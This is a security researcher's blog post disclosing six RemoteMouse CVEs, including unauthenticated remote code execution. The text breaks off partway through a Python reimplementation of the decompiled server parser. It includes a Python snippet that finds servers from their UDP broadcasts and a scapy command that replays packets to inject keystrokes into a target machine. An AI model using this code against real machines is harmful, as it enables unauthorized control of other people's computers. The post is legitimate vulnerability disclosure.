<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Mouse Trap | Axel Persinger’s Blog</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="Mouse Trap" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Six CVEs including a 0-click RCE on the latest version of RemoteMouse giving you full access to someone’s computer at the logged-on user’s privilege level." />
<meta property="og:description" content="Six CVEs including a 0-click RCE on the latest version of RemoteMouse giving you full access to someone’s computer at the logged-on user’s privilege level." />
<link rel="canonical" href="http://axelp.io/MouseTrap" />
<meta property="og:url" content="http://axelp.io/MouseTrap" />
<meta property="og:site_name" content="Axel Persinger’s Blog" />
<meta property="og:image" content="https://img.youtube.com/vi/1ceS8T2Xack/0.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-05-05T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://img.youtube.com/vi/1ceS8T2Xack/0.jpg" />
<meta property="twitter:title" content="Mouse Trap" />
<script type="application/ld+json">
{"headline":"Mouse Trap","dateModified":"2021-05-05T00:00:00+00:00","datePublished":"2021-05-05T00:00:00+00:00","description":"Six CVEs including a 0-click RCE on the latest version of RemoteMouse giving you full access to someone’s computer at the logged-on user’s privilege level.","url":"http://axelp.io/MouseTrap","@type":"BlogPosting","image":"https://img.youtube.com/vi/1ceS8T2Xack/0.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"http://axelp.io/MouseTrap"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://axelp.io/feed.xml" title="Axel Persinger's Blog" /><script async src="https://www.googletagmanager.com/gtag/js?id=UA-102998417-1"></script>
<script>
  window['ga-disable-UA-102998417-1'] = window.doNotTrack === "1" || navigator.doNotTrack === "1" || navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1";
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-102998417-1');
</script>
<link rel="shortcut icon" type="image/png" href="/images/favicon.png">
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">Axel Persinger&#39;s Blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about">About Me</a><a class="page-link" href="/CVEs">CVEs</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Mouse Trap</h1>
    <div>
        <p class="post-meta" style="float: left"><time class="dt-published" datetime="2021-05-05T00:00:00+00:00" itemprop="datePublished">
            May 5, 2021
        </time>• 
            <span itemprop="author" itemscope itemtype="http://schema.org/Person">
                <span class="p-author h-card" itemprop="name">Axel Persinger</span></span></p>
        <p class="post-meta" style="float: right">
            <span itemprop="author" itemscope itemtype="http://schema.org/Person">
            <span class="p-author h-card" itemprop="name">Exploit Development</span></span> | 
            <span itemprop="author" itemscope itemtype="http://schema.org/Person">
            <span class="p-author h-card" itemprop="name">Vulnerability Research</span></span> | 
            <span itemprop="author" itemscope itemtype="http://schema.org/Person">
            <span class="p-author h-card" itemprop="name">Capability Development</span></span></p>
    </div>
  </header>

  <div class="post-content e-content" itemprop="articleBody" style="padding-top: 50px;">
    
    
    <p>I discovered six 0days that allow a remote attacker to get full RCE on a box with no user interaction. <a href="https://github.com/CuckooEXE/MouseTrap/">MouseTrap</a> is a suite of vulnerabilities and accompanying exploits that targets the RemoteMouse application and service. As of the release date 05/06/2021, the vulnerabilities have not been patched.</p>

<!--more-->
<div style="text-align: center">
    <iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/1ceS8T2Xack" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</div>
      <h2 id="vulnerabilities">
        
        
          Vulnerabilities <a href="#vulnerabilities">#</a>
        
        
      </h2>
    

<p>It’s clear that this application is very vulnerable and puts users at risk with bad authentication mechanisms, lack of encryption, and poor default configuration. With 10,000,000+ downloads on the Android App Store <em>alone</em>, there are a lot of oblivious users who could be completely owned without ever realizing. Here are the vulnerabilities/weaknesses documented:</p>

<ul>
  <li><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27569">CVE-2021-27569</a></strong>: An issue was discovered in Emote Remote Mouse through 3.015. Attackers can maximize or minimize the window of a running process by sending the process name in a crafted packet. This information is sent in cleartext and is not protected by any authentication logic.</li>
  <li><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27570">CVE-2021-27570</a></strong>: An issue was discovered in Emote Remote Mouse through 3.015. Attackers can close any running process by sending the process name in a specially crafted packet. This information is sent in cleartext and is not protected by any authentication logic.</li>
  <li><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27571">CVE-2021-27571</a></strong>: An issue was discovered in Emote Remote Mouse through 3.015. Attackers can retrieve recently used and running applications, their icons, and their file paths. This information is sent in cleartext and is not protected by any authentication logic.</li>
  <li><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27572">CVE-2021-27572</a></strong>: An issue was discovered in Emote Remote Mouse through 3.015. Authentication Bypass can occur via Packet Replay. Remote unauthenticated users can execute arbitrary code via crafted UDP packets even when passwords are set.</li>
  <li><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27573">CVE-2021-27573</a></strong>: An issue was discovered in Emote Remote Mouse through 3.015. Remote unauthenticated users can execute arbitrary code via crafted UDP packets with no prior authorization or authentication.</li>
  <li><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27574">CVE-2021-27574</a></strong>: An issue was discovered in Emote Remote Mouse through 3.015. It uses cleartext HTTP to check, and request, updates. Thus, attackers can machine-in-the-middle a victim to download a malicious binary in place of the real update, with no SSL errors or warnings.</li>
</ul>

<p><strong>Update</strong>: The vendor has released an update, version <code class="language-plaintext highlighter-rouge">4.0.0.0</code> with new features, but did not patch any of the security vulnerabilities. I have contacted MITRE to update the CVE descriptions to note the new version number.</p>

<p><strong>Update 05/07/2021 1712</strong>: All CVE entries public and updated.</p>
      <h2 id="discovery">
        
        
          Discovery <a href="#discovery">#</a>
        
        
      </h2>
    

<p>So, like any good story, this one begins with me figuring out how to troll strangers in a video game. My friend and I were discussing ridiculous methods of playing Rainbow Six Siege, such as playing with our G29 Racing Wheel, when I suggested using one of those Android apps that allowed you to control your mouse and keyboard on your computer, using just your phone. I tried it out, promptly died and lost us the game, and started wondering how it actually worked.</p>

<p>I knew it used some sort of automatic host discovery, because once I installed the server on my desktop, it automatically appeared on my phone. So my first thought was some sort of broadcast advertisement of the server. I popped open Wireshark to inspect the traffic originating from my computer, and after filtering out the obnoxious amount of traffic from YouTube and Discord, I found something sending two UDP packets around 20 times per second:</p>

<p><img src="/images/wireshark_discovery.png" alt="Wireshark Discovery" /></p>

<p>Cool, so it looks like it blasts a hostname with something before it <code class="language-plaintext highlighter-rouge">BC 15DESKTOP-BIICVE8</code>. I’m not sure what the <code class="language-plaintext highlighter-rouge">BC 15</code> portion is, it isn’t any sort of IP address or anything either. So it looks like the phone’s application has to resolve the hostname in order to start communications with it.</p>

<p>However, this makes it trivial to find our target set since the server is so kind as to broadcast the information right to us, a small python snippet that would find this for us:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">socket</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">sock</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="mi">2007</span><span class="p">))</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
<span class="p">...</span>     <span class="n">host</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">'ignore'</span><span class="p">)[</span><span class="mi">5</span><span class="p">:]</span>
<span class="p">...</span>     <span class="k">print</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
</code></pre></div></div>

<p>Finally, I noticed when I clicked the name of a computer in the app, there was some sort of handshake that occured over TCP port 1978.</p>

<p><img src="/images/tcp_handshake.png" alt="TCP Handshake" /></p>

<p>Not very interesting, except it looks like it broadcasts the OS in the data, and a few bytes that say “nop”, which I find a little odd. However, for hacking, this seems unimportant.</p>
      <h2 id="injecting-keystrokes">
        
        
          Injecting Keystrokes <a href="#injecting-keystrokes">#</a>
        
        
      </h2>
    

<p>I popped open Wireshark to see traffic coming across the (proverbial) wire, and discovered UDP packets being sent to my computer from my phone. To make a more controlled test, I simply typed ‘a’ on my phone and saw this packet appear:</p>

<p><img src="/images/wireshark_character.png" alt="'a' character packet" /></p>

<p>Interesting, looks like a string is sent in plaintext: <code class="language-plaintext highlighter-rouge">key 7[ras]84</code>. Well at first I checked if 84 was the hex/dec for ‘a’, but unfortuantely it wasn’t…</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'a'</span><span class="p">)</span>
<span class="mi">97</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">'a'</span><span class="p">))</span>
<span class="s">'0x61'</span>
</code></pre></div></div>

<p>Then I I thought perhaps the 84, the “[ras]”, or some other portion of the UDP Data field was a <a href="https://en.wikipedia.org/wiki/Cryptographic_nonce">nonce</a>, preventing me from replaying that same packet. To test it, I took the UDP Data field, and threw it into scapy to replicate the keystroke:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="c1"># The time.sleep exists so I could move my mouse back to a text editor to ensure the keystroke was registered
</span><span class="o">&gt;&gt;&gt;</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span> <span class="n">send</span><span class="p">(</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">"192.168.86.195"</span><span class="p">)</span><span class="o">/</span><span class="n">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="mi">1978</span><span class="p">)</span><span class="o">/</span><span class="n">Raw</span><span class="p">(</span><span class="n">load</span><span class="o">=</span><span class="s">"key  7[ras]84"</span><span class="p">))</span>
<span class="p">.</span>
<span class="n">Sent</span> <span class="mi">1</span> <span class="n">packets</span><span class="p">.</span>
</code></pre></div></div>

<p>Awesome, it works! That means there is no nonce, and you can freely inject keystrokes. Knowing that 84 wasn’t the hex or integer for the letter we cared for, I decided to dig into the server itself and see what was going on.</p>
      <h2 id="reversing-the-server">
        
        
          Reversing the Server <a href="#reversing-the-server">#</a>
        
        
      </h2>
    

<p>The RemoteMouse server gets installed to <code class="language-plaintext highlighter-rouge">C:\Program Files (x86)\Remote Mouse</code> by default, and immediately there are three files of interest: <code class="language-plaintext highlighter-rouge">RemoteMouse.exe</code>, <code class="language-plaintext highlighter-rouge">RemoteMouseCore.exe</code>, and <code class="language-plaintext highlighter-rouge">RemoteMouseService.exe</code>. I’m going to go ahead and guess that <code class="language-plaintext highlighter-rouge">RemoteMouseService.exe</code> is what is responsible for things like starting up on boot, and keeping the process in the background, etc. I guessed that the majority of the logic, and hopefully the message parsing logic would reside in <code class="language-plaintext highlighter-rouge">RemoteMouseCore.exe</code>, and luckily I was right.</p>

<p>I threw the executable into Ghidra and saw the telltale sign that it was a .NET executable: the entrypoint redirected to <code class="language-plaintext highlighter-rouge">_CorExeMain</code>.</p>

<p><img src="/images/ghidra_entry.png" alt="Ghidra Entrypoint Decompilation" /></p>

<p>My go-to .NET reversing tool is, and always will be, dnSpy, so I booted it up and started poking around. I landed in a class that seemed to tokenize a string around some substrings that I saw in the original message, namely “[ras]”. There is a function inside of <code class="language-plaintext highlighter-rouge">internal class w</code>, with the signature <code class="language-plaintext highlighter-rouge">public static void a(byte[] A_0, int A_1)</code>. You can see the function, and my version written in Python (for ease of following) below:</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">a</span><span class="p">(</span><span class="kt">byte</span><span class="p">[]</span> <span class="n">A_0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">A_1</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">A_0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">"[ras]"</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="kt">char</span><span class="p">[]</span> <span class="n">separator</span> <span class="p">=</span> <span class="s">"[ras]"</span><span class="p">.</span><span class="nf">ToCharArray</span><span class="p">();</span>
		<span class="kt">string</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">text</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="n">separator</span><span class="p">);</span>
		<span class="kt">char</span> <span class="n">c</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="nf">ToChar</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="nf">ToInt32</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="n">array</span><span class="p">.</span><span class="n">Length</span> <span class="p">-</span> <span class="m">1</span><span class="p">])</span> <span class="p">^</span> <span class="m">53</span><span class="p">);</span>
		<span class="n">w</span><span class="p">.</span><span class="nf">VkKeyScan</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
		<span class="k">new</span> <span class="nf">InputSimulator</span><span class="p">().</span><span class="n">Keyboard</span><span class="p">.</span><span class="nf">TextEntry</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">"[+]"</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="kt">string</span><span class="p">[]</span> <span class="n">array2</span> <span class="p">=</span> <span class="n">text</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="k">new</span> <span class="kt">char</span><span class="p">[]</span>
		<span class="p">{</span>
			<span class="sc">'['</span><span class="p">,</span>
			<span class="sc">'+'</span><span class="p">,</span>
			<span class="sc">']'</span>
		<span class="p">},</span> <span class="n">StringSplitOptions</span><span class="p">.</span><span class="n">RemoveEmptyEntries</span><span class="p">);</span>
		<span class="n">VirtualKeyCode</span> <span class="n">virtualKeyCodes</span> <span class="p">=</span> <span class="p">(</span><span class="n">VirtualKeyCode</span><span class="p">)</span><span class="n">GlobalsVars</span><span class="p">.</span><span class="nf">getVirtualKeyCodes</span><span class="p">(</span><span class="n">array2</span><span class="p">[</span><span class="m">1</span><span class="p">]);</span>
		<span class="n">VirtualKeyCode</span> <span class="n">virtualKeyCodes2</span> <span class="p">=</span> <span class="p">(</span><span class="n">VirtualKeyCode</span><span class="p">)</span><span class="n">GlobalsVars</span><span class="p">.</span><span class="nf">getVirtualKeyCodes</span><span class="p">(</span><span class="n">array2</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
		<span class="k">new</span> <span class="nf">InputSimulator</span><span class="p">().</span><span class="n">Keyboard</span><span class="p">.</span><span class="nf">ModifiedKeyStroke</span><span class="p">(</span><span class="n">virtualKeyCodes2</span><span class="p">,</span> <span class="n">virtualKeyCodes</span><span class="p">);</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">"[noe]"</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="kt">byte</span><span class="p">[]</span> <span class="n">array3</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">A_1</span> <span class="p">-</span> <span class="m">5</span><span class="p">];</span>
		<span class="n">array3</span><span class="p">.</span><span class="nf">Initialize</span><span class="p">();</span>
		<span class="n">Buffer</span><span class="p">.</span><span class="nf">BlockCopy</span><span class="p">(</span><span class="n">A_0</span><span class="p">,</span> <span class="m">5</span><span class="p">,</span> <span class="n">array3</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">A_1</span> <span class="p">-</span> <span class="m">5</span><span class="p">);</span>
		<span class="kt">string</span> <span class="n">@string</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">array3</span><span class="p">);</span>
		<span class="k">new</span> <span class="nf">InputSimulator</span><span class="p">().</span><span class="n">Keyboard</span><span class="p">.</span><span class="nf">TextEntry</span><span class="p">(</span><span class="n">@string</span><span class="p">);</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">"[wiod]"</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="kt">char</span><span class="p">[]</span> <span class="n">separator2</span> <span class="p">=</span> <span class="s">"[wiod]"</span><span class="p">.</span><span class="nf">ToCharArray</span><span class="p">();</span>
		<span class="kt">string</span><span class="p">[]</span> <span class="n">array4</span> <span class="p">=</span> <span class="n">text</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="n">separator2</span><span class="p">);</span>
		<span class="n">x</span><span class="p">.</span><span class="nf">c</span><span class="p">((</span><span class="kt">uint</span><span class="p">)</span><span class="n">w</span><span class="p">.</span><span class="nf">VkKeyScan</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="nf">ToChar</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="nf">ToInt32</span><span class="p">(</span><span class="n">array4</span><span class="p">[</span><span class="n">array4</span><span class="p">.</span><span class="n">Length</span> <span class="p">-</span> <span class="m">1</span><span class="p">]))));</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">"[wiou]"</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="kt">char</span><span class="p">[]</span> <span class="n">separator3</span> <span class="p">=</span> <span class="s">"[wiou]"</span><span class="p">.</span><span class="nf">ToCharArray</span><span class="p">();</span>
		<span class="kt">string</span><span class="p">[]</span> <span class="n">array5</span> <span class="p">=</span> <span class="n">text</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="n">separator3</span><span class="p">);</span>
		<span class="n">x</span><span class="p">.</span><span class="nf">b</span><span class="p">((</span><span class="kt">uint</span><span class="p">)</span><span class="n">w</span><span class="p">.</span><span class="nf">VkKeyScan</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="nf">ToChar</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="nf">ToInt32</span><span class="p">(</span><span class="n">array5</span><span class="p">[</span><span class="n">array5</span><span class="p">.</span><span class="n">Length</span> <span class="p">-</span> <span class="m">1</span><span class="p">]))));</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">StartsWith</span><span class="p">(</span><span class="s">"[kld]"</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="k">null</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">text</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">"[*]"</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="k">try</span>
		<span class="p">{</span>
			<span class="n">text</span> <span class="p">=</span> <span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="m">5</span><span class="p">).</span><span class="nf">Trim</span><span class="p">();</span>
			<span class="kt">string</span><span class="p">[]</span> <span class="n">array6</span> <span class="p">=</span> <span class="n">text</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="k">new</span> <span class="kt">char</span><span class="p">[]</span>
			<span class="p">{</span>
				<span class="sc">'['</span><span class="p">,</span>
				<span class="sc">'*'</span><span class="p">,</span>
				<span class="sc">']'</span>
			<span class="p">},</span> <span class="n">StringSplitOptions</span><span class="p">.</span><span class="n">RemoveEmptyEntries</span><span class="p">);</span>
			<span class="n">VirtualKeyCode</span> <span class="n">virtualKeyCodes3</span> <span class="p">=</span> <span class="p">(</span><span class="n">VirtualKeyCode</span><span class="p">)</span><span class="n">GlobalsVars</span><span class="p">.</span><span class="nf">getVirtualKeyCodes</span><span class="p">(</span><span class="n">array6</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
			<span class="n">List</span><span class="p">&lt;</span><span class="n">VirtualKeyCode</span><span class="p">&gt;</span> <span class="n">list</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="n">VirtualKeyCode</span><span class="p">&gt;();</span>
			<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">array6</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
			<span class="p">{</span>
				<span class="n">VirtualKeyCode</span> <span class="n">virtualKeyCodes4</span> <span class="p">=</span> <span class="p">(</span><span class="n">VirtualKeyCode</span><span class="p">)</span><span class="n">GlobalsVars</span><span class="p">.</span><span class="nf">getVirtualKeyCodes</span><span class="p">(</span><span class="n">array6</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
				<span class="n">list</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="n">virtualKeyCodes4</span><span class="p">);</span>
			<span class="p">}</span>
			<span class="n">VirtualKeyCode</span><span class="p">[]</span> <span class="n">modifierKeyCodes</span> <span class="p">=</span> <span class="n">list</span><span class="p">.</span><span class="nf">ToArray</span><span class="p">();</span>
			<span class="k">new</span> <span class="nf">InputSimulator</span><span class="p">().</span><span class="n">Keyboard</span><span class="p">.</span><span class="nf">ModifiedKeyStroke</span><span class="p">(</span><span class="n">modifierKeyCodes</span><span class="p">,</span> <span class="n">virtualKeyCodes3</span><span class="p">);</span>
			<span class="k">return</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="k">catch</span>
		<span class="p">{</span>
			<span class="k">return</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(!</span><span class="n">text</span><span class="p">.</span><span class="nf">StartsWith</span><span class="p">(</span><span class="s">"[klu]"</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="k">null</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">InputSimulator</span> <span class="n">inputSimulator</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">InputSimulator</span><span class="p">();</span>
		<span class="n">VirtualKeyCode</span> <span class="n">virtualKeyCodes5</span> <span class="p">=</span> <span class="p">(</span><span class="n">VirtualKeyCode</span><span class="p">)</span><span class="n">GlobalsVars</span><span class="p">.</span><span class="nf">getVirtualKeyCodes</span><span class="p">(</span><span class="n">text</span><span class="p">);</span>
		<span class="n">inputSimulator</span><span class="p">.</span><span class="n">Keyboard</span><span class="p">.</span><span class="nf">KeyPress</span><span class="p">(</span><span class="n">virtualKeyCodes5</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">_split</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">d</span><span class="p">:</span> <span class="nb">list</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
    <span class="s">"""
    Reimplementing the weird string.Split function .NET uses

    :param s: String to split
    :type s: str
    :param d: List of characters to delimit on
    :type d: list
    :return: Split string
    :rtype: str
    """</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">getVirtualKeyCodes</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="s">"""
    This performs a look up given a string, i.e. "cmd", and returns the virtual key code, i.e. 91;

    :param s: String to look up
    :type s: str
    :return: Byte representing that keycode
    :rtype: int
    """</span>
    <span class="c1"># Just a lookup table of this https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
</span>    <span class="k">return</span> <span class="mh">0x00</span>



<span class="k">class</span> <span class="nc">w</span><span class="p">():</span>

    <span class="o">@</span><span class="nb">classmethod</span>
    <span class="k">def</span> <span class="nf">VkKeyScan</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span> <span class="n">c</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
        <span class="s">"""
        Translates a character to the corresponding virtual-key code and shift state for the current keyboard.
        https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-vkkeyscana

        :param c: Character to convert
        :type c: str
        :return: virtual-keycode
        :rtype: int
        """</span>
        <span class="c1"># I think this technically re-assigns c, since in C# it looks like it doesn't return a value?
</span>        <span class="k">return</span> <span class="mh">0x0</span>


    <span class="o">@</span><span class="nb">classmethod</span>
    <span class="k">def</span> <span class="nf">a</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span> <span class="n">A_0</span><span class="p">:</span> <span class="nb">bytearray</span><span class="p">,</span> <span class="n">A_1</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">text</span> <span class="o">=</span> <span class="n">A_0</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>

        <span class="k">if</span> <span class="s">'[ras]'</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
            <span class="n">array</span> <span class="o">=</span> <span class="n">_split</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="nb">list</span><span class="p">(</span><span class="s">'[ras]'</span><span class="p">))</span>
            <span class="n">c</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span> <span class="nb">int</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">^</span> <span class="mi">53</span> <span class="p">)</span>
            <span class="n">c</span> <span class="o">=</span> <span class="n">w</span><span class="p">.</span><span class="n">VkKeyScan</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
            <span class="c1"># InputSimulator().Keyboard.TextEntry(c)
</span>            <span class="k">return</span>
        
        <span class="k">if</span> <span class="s">'[+]'</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
            <span class="n">array2</span> <span class="o">=</span> <span class="n">_split</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="nb">list</span><span class="p">(</span><span class="s">'[+]'</span><span class="p">))</span>
